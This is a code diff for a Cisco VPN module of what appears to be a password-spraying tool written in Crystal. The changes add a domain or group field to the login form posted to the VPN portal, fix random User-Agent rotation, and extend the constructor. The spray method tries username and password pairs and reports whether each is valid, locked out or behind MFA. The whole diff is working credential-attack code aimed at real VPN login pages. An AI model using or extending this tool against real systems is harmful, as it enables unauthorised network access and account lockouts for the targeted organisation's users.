@@ -1,12 +1,13 @@
 require "http/client"
 
 class Cisco_VPN < Sprayer
-
+    property domain : String 
     ## only uncomment if needed
-    # def initialize(usernames : Array(String), password : Array(String))
-    #     # init any special or default variables here
-    #     super()
-    # end
+    def initialize(usernames : Array(String), password : Array(String))
+        # init any special or default variables here
+        super
+        @domain = ""
+    end
 
     # returns an array of [username, password, valid, lockout, mfa]
     def spray(username : String, password : String) 
@@ -28,13 +29,13 @@ class Cisco_VPN < Sprayer
         client = HTTP::Client.new(url, tls: context)
         # and some basic header options
         header = HTTP::Headers{ # headers for post request 
-            "User-Agent" => @useragents[rand(0..@useragents.size)],
+            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))],
             "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language" => "en-US,en;q=0.5",
             "Accept-Encoding" => "gzip, deflate",
             "Content-Type" => "application/x-www-form-urlencoded"
         }
-        form = "tgroup=&next=&tgcookieset=&username=#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&Login=Login" 
+        form = "tgroup=&next=&tgcookieset=&group_list=#{URI.encode_www_form(@domain)}&username=#{URI.encode_www_form(username)}&password=#{URI.encode_www_form(password)}&Login=Login" 
         
         # here is the basic 
         page = client.post(path, headers: header, form: form)
